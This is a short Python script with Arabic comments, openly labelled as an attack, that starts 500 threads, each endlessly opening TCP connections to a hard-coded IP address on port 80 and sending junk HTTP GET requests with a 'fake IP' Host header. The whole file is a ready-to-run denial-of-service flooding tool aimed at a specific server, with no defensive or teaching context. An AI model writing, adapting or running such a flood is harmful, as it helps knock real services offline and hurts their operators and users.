import socket
import threading

# إعدادات الهجوم
target_ip = '82.153.70.229'  # العنوان IP للخادم المستهدف
target_port = 80  # المنفذ المستهدف
fake_ip = '182.21.20.32'  # عنوان IP زائف (ليس إلزامياً)

def attack():
    while True:
        # إنشاء اتصال سوكيت
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # إرسال طلب HTTP GET زائف
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        
        s.close()

# إنشاء عدد من الثريدات لتنفيذ الهجوم بشكل متوازي
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()